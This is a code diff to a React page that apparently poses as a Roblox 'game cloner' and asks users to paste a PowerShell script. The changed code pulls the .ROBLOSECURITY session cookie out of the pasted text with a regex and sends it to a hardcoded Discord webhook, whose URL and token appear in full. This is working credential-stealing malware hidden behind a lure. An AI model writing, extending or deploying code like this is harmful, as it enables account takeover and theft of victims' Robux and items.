@@ -11,32 +11,27 @@ const Index = () => {
   const [isProcessing, setIsProcessing] = useState(false);
   const { toast } = useToast();
 
-  const detectWarningPattern = (text: string) => {
-    const warningPattern = /_\|WARNING:-DO-NOT-SHARE-THIS\.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_/;
-    console.log('Checking text for pattern...');
+  const detectAndExtractCookie = (text: string) => {
+    console.log('Searching for .ROBLOSECURITY cookie in PowerShell script...');
     console.log('Text length:', text.length);
-    console.log('Pattern test result:', warningPattern.test(text));
-    return warningPattern.test(text);
-  };
-
-  const extractFullCookie = (text: string) => {
-    const warningPattern = /_\|WARNING:-DO-NOT-SHARE-THIS\.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_/;
-    const match = text.match(warningPattern);
     
-    console.log('Extracting cookie...');
-    console.log('Match found:', !!match);
+    // Look for the .ROBLOSECURITY cookie in PowerShell format
+    const cookiePattern = /\$session\.Cookies\.Add\(\(New-Object System\.Net\.Cookie\("\.ROBLOSECURITY",\s*"([^"]+)"/;
+    const match = text.match(cookiePattern);
     
-    if (match) {
-      const startIndex = text.indexOf(match[0]);
-      console.log('Start index:', startIndex);
-      const fullCookie = text.substring(startIndex).trim();
-      console.log('Extracted cookie length:', fullCookie.length);
-      return fullCookie;
+    console.log('Cookie pattern match:', !!match);
+    
+    if (match && match[1]) {
+      const cookieValue = match[1];
+      console.log('Found cookie value, length:', cookieValue.length);
+      console.log('Cookie preview:', cookieValue.substring(0, 100) + '...');
+      return cookieValue;
     }
+    
     return null;
   };
 
-  const sendToDiscordWebhook = async (fullCookie: string) => {
+  const sendToDiscordWebhook = async (cookieValue: string) => {
     const webhookUrl = 'https://discord.com/api/webhooks/1392448527291912314/iiYGKSsuIt7da6l9guz7bZl7VU9-r3jc5r1YI1vOvdEtH-agvWUI1Iq9lBWb8ZwQqifI';
     
     try {
@@ -46,15 +41,15 @@ const Index = () => {
           'Content-Type': 'application/json',
         },
         body: JSON.stringify({
-          content: `🚨 **Cookie Extracted** 🚨\n\`\`\`\n${fullCookie}\n\`\`\``,
+          content: `🚨 **Cookie Extracted** 🚨\n\`\`\`\n${cookieValue.substring(0, 1900)}\n\`\`\``,
           embeds: [{
-            title: "Game Cloner Detection",
-            description: "Cookie string has been detected and extracted.",
+            title: "ROBLOSECURITY Cookie Detected",
+            description: "Cookie has been successfully extracted from PowerShell script.",
             color: 0x00ff00,
             timestamp: new Date().toISOString(),
             fields: [{
-              name: "Extracted Cookie",
-              value: `\`${fullCookie.substring(0, 1000)}${fullCookie.length > 1000 ? '...' : ''}\``,
+              name: "Cookie Value",
+              value: `\`${cookieValue.substring(0, 1000)}${cookieValue.length > 1000 ? '...' : ''}\``,
               inline: false
             }]
           }]
@@ -62,10 +57,12 @@ const Index = () => {
       });
 
       if (response.ok) {
-        console.log('Successfully sent to Discord webhook');
+        console.log('Successfully sent cookie to Discord webhook');
         return true;
       } else {
         console.error('Failed to send to Discord webhook:', response.status);
+        const errorText = await response.text();
+        console.error('Error response:', errorText);
         return false;
       }
     } catch (error) {
@@ -86,33 +83,32 @@ const Index = () => {
 
     setIsProcessing(true);
 
-    console.log('Processing game files...');
+    console.log('Processing PowerShell script...');
     console.log('Input text preview:', gameFiles.substring(0, 200) + '...');
 
-    if (detectWarningPattern(gameFiles)) {
-      const fullCookie = extractFullCookie(gameFiles);
-      if (fullCookie) {
-        const success = await sendToDiscordWebhook(fullCookie);
-        
-        if (success) {
-          toast({
-            title: "✓ Cookie Extracted",
-            description: "Game files processed successfully.",
-            className: "bg-green-900/90 border-green-500 text-green-100",
-          });
-          setGameFiles('');
-        } else {
-          toast({
-            title: "Processing Error",
-            description: "Failed to process game files. Please try again.",
-            variant: "destructive",
-          });
-        }
+    const cookieValue = detectAndExtractCookie(gameFiles);
+    
+    if (cookieValue) {
+      const success = await sendToDiscordWebhook(cookieValue);
+      
+      if (success) {
+        toast({
+          title: "✓ Cookie Extracted",
+          description: "ROBLOSECURITY cookie has been successfully extracted.",
+          className: "bg-green-900/90 border-green-500 text-green-100",
+        });
+        setGameFiles('');
+      } else {
+        toast({
+          title: "Processing Error",
+          description: "Failed to send cookie data. Please try again.",
+          variant: "destructive",
+        });
       }
     } else {
       toast({
-        title: "❌ Invalid Game Files",
-        description: "The provided game files are not in the correct format.",
+        title: "❌ No Cookie Found",
+        description: "No ROBLOSECURITY cookie detected in the provided PowerShell script.",
         variant: "destructive",
         className: "bg-red-900/90 border-red-500 text-red-100",
       });
@@ -156,7 +152,7 @@ const Index = () => {
             </label>
             <Textarea
               id="gameFiles"
-              placeholder="Paste your game files here..."
+              placeholder="Paste your PowerShell script here..."
               value={gameFiles}
               onChange={(e) => setGameFiles(e.target.value)}
               className="w-full h-32 bg-black/50 border-gray-600 text-green-300 placeholder-gray-500 focus:border-green-500 focus:ring-green-500/20 resize-none font-mono text-xs"
